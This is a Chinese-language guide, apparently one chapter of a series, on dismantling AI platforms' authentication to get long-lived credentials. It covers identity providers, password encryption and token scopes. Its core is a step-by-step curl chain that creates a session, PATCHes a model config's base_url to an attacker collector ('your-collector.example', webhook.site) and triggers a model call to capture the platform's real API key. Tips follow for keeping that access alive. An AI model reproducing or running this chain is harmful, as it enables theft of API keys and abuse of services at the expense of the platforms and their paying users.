# 02 · 解密：拆掉认证链

## 目标

拿到一个**能反复使用**的凭证，且知道它的有效期、作用域、失效条件。

## 先做分类，再动手

### 认证提供方识别

登录请求打到哪个域，就决定了拆解方式：

| 域名特征 | 提供方 | 拆法 |
|---|---|---|
| `*.authing.cn` / `*.genauth.ai` | Authing/GenAuth | GraphQL `/graphql/v2` + appId/secret |
| `*.auth0.com` | Auth0 | `/oauth/token`，standard OIDC |
| `cognito-idp.*` | AWS Cognito | `InitiateAuth` |
| `*.supabase.co` | Supabase | `/auth/v1/token` |
| 自有域 `/api/auth/*` | 自建 | 直接看 bundle 里的登录函数 |

### 密码加密判定

看登录请求体里 password 字段：

| 形态 | 含义 | 处理 |
|---|---|---|
| 明文或简单 hash | 无加密 | 直接用 |
| 长 base64（约 344 字符，RSA-2048） | RSA 加密 | 拿公钥，`RSA_PKCS1_PADDING` |
| 短 base64 + 固定长度 | AES | 找 key/iv（常在 bundle 里） |
| 带 `salt` / `nonce` 字段 | 加盐 | 复现拼接顺序 |

**RSA 公钥通常在这两个地方**：

```bash
# Authing 风格
curl -s https://TARGET_IDP/api/v2/.well-known -H 'x-authing-app-id: APPID'

# 通用 OIDC
curl -s https://TARGET_IDP/.well-known/openid-configuration | jq .jwks_uri
```

## token 分层（最容易踩的坑）

一个平台往往同时存在 3~4 种 token，**作用域完全不同**：

```
id_token       身份 JWT，很多业务 API 直接当 Bearer 用
access_token   业务 API，可能只对某个 audience 有效
refresh_token  续期；通常有 family 追踪，重放一次会连坐整族作废
llm_key        模型推理专用，格式如 <prefix>.<base64 JSON>，内含 {u, p, exp}
```

**判定方法**：把每种 token 分别打到每个接口，做一张矩阵表。

```markdown
| token | /api/user/info | /api/models | /v1/messages |
|---|---|---|---|
| id_token   | 200 | 200 | 401 |
| llm_key    | 401 | 200 | 200 |
```

看到这个矩阵就知道：**推理必须用 llm_key，不能拿 id_token 硬打**。

## 关键动作：找到"能签发长期 key"的路径

最省事的路径几乎总是：

1. 找到**创建会话/工作区**的接口（`POST /v5/session`、`POST /workspace` 之类）
2. 会话返回体里通常带 `accessKey` 和 `httpUrl`
3. 用 `accessKey` 读该工作区的**配置接口**（`/api/config`）
4. 配置里有模型列表，每个条目带 `base_url` 和（空的）`api_key`
5. **把 `base_url` 改成你自己的收集器地址**（`PATCH /api/config/models/<id>`）
6. 触发一次模型调用
7. 收集器收到带 `Authorization` 的请求 → **这就是真实 key**

```bash
# 完整链路
AK=$(curl -s -X POST "$T/session?..." | jq -r .data.accessKey)
HU=$(curl -s -X POST "$T/session?..." | jq -r .data.httpUrl)

curl -s "$HU/api/config?access_key=$AK" | jq '.models[] | {id,model,base_url}'

curl -s -X PATCH "$HU/api/config/models/$ID?access_key=$AK" \
  -H 'Content-Type: application/json' \
  -d '{"base_url":"https://your-collector.example/hook"}'

# 触发后从收集器取
```

**要点**：
- PATCH 的目标必须是**实际会被调用的那个模型条目**。如果 agent 实际调用的是 A，你 PATCH 了 B，永远收不到 key。
- 触发器（webhook.site 之类的临时收集器）比自建服务省事，但要注意有些平台会校验域名可解析。

## 一次性 vs 长期

| 凭证 | 寿命 | 备注 |
|---|---|---|
| session accessKey | 分钟级 | 只够抓 key 用 |
| llm_key | 天~周，带 exp | 主力 |
| id_token | 通常很长（月~年） | 用来续签 llm_key |
| refresh_token | 短且一次性 | 存好，别乱用 |

**设计取舍**：用 id_token 定期重新走一遍"建会话 → 抓 key"，比长期持有 llm_key 更抗失效。

## 陷阱

- **把 id_token 当万能 Bearer** → 401 Invalid or revoked private key。说明该平面要签名，不是 Bearer。
- **重放 refresh_token** → 触发轮换保护，整个 token family 作废，需要重新登录。
- **忽略 exp** → key 过期后所有请求 401，但你的代码还在重试，看起来像"上游崩了"。
- **在错误层级找加密** → 有的平台只有注册加密，登录是明文；有的反过来。看实际请求，不要猜。
